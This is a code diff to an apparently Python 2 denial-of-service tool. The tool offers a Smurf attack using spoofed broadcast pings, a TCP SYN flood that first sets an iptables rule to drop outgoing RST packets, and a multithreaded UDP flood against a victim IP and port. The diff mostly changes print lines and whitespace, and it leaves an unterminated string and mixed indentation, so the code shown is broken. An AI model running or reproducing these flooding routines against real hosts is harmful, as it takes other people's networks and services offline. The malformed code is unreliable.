@@ -52,13 +52,14 @@ while 1:
 
 # Smurf Attack
     if userInput == '1':
-        print "Smurf Attack:\n\nPing Broadcast IP, spoofed with victim's IP."
-        print 'Nodes reply to target.'
-        print '\nSmurf Attack Initiated: '
-        print '-----------------------'
+        print 'Smurf Attack\n
+        print 'Smurf Attack Initiated\n'
+        print '----------------------\n'
+	
         broadcast = raw_input('\nBroadcast      IP: ')
         victim = raw_input('\nInput target      IP: ')
-        for ping in range(100):
+        
+	for ping in range(100):
             a = 0
         while a < 100:
             a = a + 1
@@ -67,17 +68,16 @@ while 1:
 
 # TCP SYN Flood Attack
     elif userInput == '2':
-        print '\n\nTCP Syn Flood Attack:\n\nSend customized SYN packets to target.'
+        print '\n\nTCP Syn Flood Attack:\n'
         print 'Victim queues replies with SYN/ACK.\n'
-        # iptables stop output RST packets
         print "\nnote - Enabling iptables to drop RST flag"
         time.sleep(1)
         os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')
         print '\n TCP SYN Flood Initiated.'
         print ' ------------------------'
         dstIP = raw_input('\nTCP Flood Target IP: ')
-        print '-----------------'
         dport = int(raw_input('Destination Port: '))
+	
         for synAttack in range(100):
             s = 0
             while s < 10:
@@ -109,7 +109,8 @@ while 1:
                 sport=RandShort()) / "Hello World"
                 Attack = send(udpAttack, inter=0.00000001, verbose=0)
                 Attack
-        # Threading: Send 10 simultaneous packets * (range of updAttk function.)
+        
+	# Threading: Send 10 simultaneous packets * (range of updAttk function.)
         for i in range(10):
             t = Thread(target=udpAttk, args=(i,))
             t.start()
@@ -122,8 +123,8 @@ while 1:
     elif userInput == 'a':
         print '\nChecking for LAN IP.'
         print '--------------------\n'
-	print "Trying: sudo ifconfig"
-        os.system('sudo ifconfig')
+	print "Trying: ifconfig"
+        os.system('ifconfig')
         print 'Returning to menu...'
         time.sleep(1)
     else:
